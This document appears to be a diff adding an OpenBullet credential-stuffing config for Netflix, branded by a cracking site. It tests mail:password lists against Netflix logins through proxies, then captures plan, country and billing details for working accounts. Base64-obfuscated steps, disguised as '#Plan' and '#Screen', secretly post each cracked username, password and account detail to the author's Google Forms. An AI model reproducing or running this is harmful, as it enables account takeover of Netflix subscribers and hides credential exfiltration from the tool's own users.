@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "Netflix @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:25:32.2219681+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Netflix REQUEST GET "https://www.netflix.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+#Token PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" -> VAR "Token" 
+
+#Perbaikan FUNCTION URLEncode "<Token>" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount" 
+  CONTENT "authURL=<Token>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.netflix.com/login" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"unrecognized_email\"" 
+    KEY "\"value\":\"incorrect_password\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xSDN5UHQtOXlla09xRnVKNFVhak1uUjd1SUY4eFpoTFh6elhhZktoaXVqNC92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "class=\"profile-name\"><span id=\"\" data-uia=\"\">" "</span>" -> CAP "Name" 
+
+#Negara PARSE "<SOURCE>" LR "\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#Paket PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> CAP "Plan" 
+
+#Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" ",\"" -> CAP "Trial" 
+
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" ",\"" -> CAP "DVD" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZDZBM3Y1REJqVkVsVlNHb2oyYnpwQ2x2RzM3Y0JTcmtWd3hJUVoySmdvdXl2ZHpRL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Layar PARSE "<SOURCE>" LR "\"maxStreams\":" ",\"" -> CAP "Screens" 
+
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" ",\"" -> CAP "HD" 
+
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" ",\"" -> CAP "Ultra HD" 
+
+#Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"," -> CAP "Next Billing" "" "  >>>NETFLIX<<<  Visit us @CrackingLegend.pw" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTE3NDM2NTg5Mz1OZXRmbGl4JmVudHJ5LjI5MDM3MDQzND08VVNFUj46PFBBU1M+JmVudHJ5LjYzMDA5MDM1Mj18UGxhbjo8UGxhbj58TmV4dCBCaWxsaW5nOjxOZXh0IEJpbGxpbmc+fENvdW50cnk6PENvdW50cnk+fFRyaWFsOjxUcmlhbD58RFZEOjxEVkQ+fFNjcmVlbnM6PFNjcmVlbnM+fEhEOjxIRD58VWx0cmEgSEQ6PFVsdHJhIEhEPnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMi04NTczOTE3OTEyOTgxOTcyNjk1JTIyJTVEJTBEJTBBJnBhZ2VIaXN0b3J5PTAmZmJ6eD0tODU3MzkxNzkxMjk4MTk3MjY5NQ==" -> VAR "LRU3" 
+
+#Perbaikan FUNCTION Replace "\\x2F" "-" "<Next Billing>" -> CAP "Next Billing" 
+
+#Perbaikan FUNCTION Replace "." "-" "<Next Billing>" -> CAP "Next Billing" 
+
+#Perbaikan FUNCTION Replace "\\u200F" "" "<Next Billing>" -> CAP "Next Billing" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Screen REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
